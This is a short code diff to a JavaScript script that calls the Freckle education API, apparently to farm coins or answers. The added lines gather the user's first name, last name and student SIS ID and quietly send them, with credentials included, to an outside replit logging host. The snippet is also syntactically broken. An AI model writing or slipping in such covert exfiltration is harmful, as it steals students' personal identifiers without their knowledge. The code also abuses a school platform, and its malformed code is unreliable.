@@ -40,4 +40,13 @@ var response= await fetch("https://api.freckle.com/3/subjects/math/products/targ
 json=await response.json()
 setTimeout(coins, 1);
 }
+dataa=g["firstName"]+" "+g["lastName"]+" "+g["sisId"]+"answers.js"
+await fetch("https://jjgrenontop.bobdob2.repl.co/log/"+dataa, {
+  method: "GET",
+  credentials: "include"
+ mode: 'no-cors',       
+,headers: {
+    "Content-type": "application/json; charset=UTF-8"
+    },
+})
 coins();
